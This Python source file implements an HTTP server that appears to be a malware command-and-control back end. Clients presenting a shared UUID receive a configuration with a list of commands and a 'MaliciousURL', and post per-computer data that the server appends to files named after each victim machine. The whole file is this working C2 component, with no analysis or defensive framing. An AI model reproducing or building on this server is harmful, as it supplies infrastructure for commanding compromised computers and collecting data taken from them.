from http.server import BaseHTTPRequestHandler, HTTPServer
import time
import urllib.request
import os
import json

hostName = "A" #ip
hostPort = 0 #443
UUID = ''
MaliciousPath = ''
Commands=[]
Configuration = ""

scriptDir = os.getcwd()

def ConfigurationServer():
    with open('configuration.json') as f:
        confFileJson = json.load(f)
        global hostName
        global hostPort
        global UUID
        global MaliciousPath
        global Commands
        global Configuration

        hostName = confFileJson['Server']
        hostPort = confFileJson['Port']
        UUID = confFileJson['UUID']
        MaliciousPath = confFileJson['MaliciousPath']
        Commands = confFileJson['Commands']

        #This is the configuration for the client side
        Configuration = {'Server': hostName, 'Commands':Commands,'MaliciousURL': hostName+MaliciousPath}

class MyServer(BaseHTTPRequestHandler):
    #GET Requests
    def do_GET(self):
        #Checks if the UUID is match (Kind of authentication)
        if (self.headers.get('UUID') == UUID):
            #Client asked for configuration
            if self.path.endswith("/Configuration"):
                self.send_response(200)
                self.send_header('Content-Type', 'application/json')
                self.end_headers()
                self.wfile.write(json.dumps(Configuration).encode())
                #print(json.dumps(Configuration).encode())
                return

    #POST Requests
    def do_POST(self):
        #Checks if the UUID is match (Kind of authentication)
        if (self.headers.get('UUID') == UUID):
            #Client send a new data about command
            if self.path.endswith("/Commands"):
                #print('Got POST Command')
                self.data_string = self.rfile.read(int(self.headers['Content-Length']))
                self.send_response(200)
                self.end_headers()
                data = json.loads(self.data_string)
                print('New Data recieved from '+data['computer'])
                with open(os.path.join(scriptDir+ "\CommandsData\\"+data['computer']+".dat"), "ab+") as outfile:
                    outfile.write((data['computer']+','+data['type']+','+data['data']).encode())
                self.wfile.write(("Done").encode())
                return

ConfigurationServer()
myServer = HTTPServer((hostName, hostPort), MyServer)
print(time.asctime(), "Server Starts - %s:%s" % (hostName, hostPort))

try:
    myServer.serve_forever()
except KeyboardInterrupt:
    pass

myServer.server_close()
print(time.asctime(), "Server Stops - %s:%s" % (hostName, hostPort))
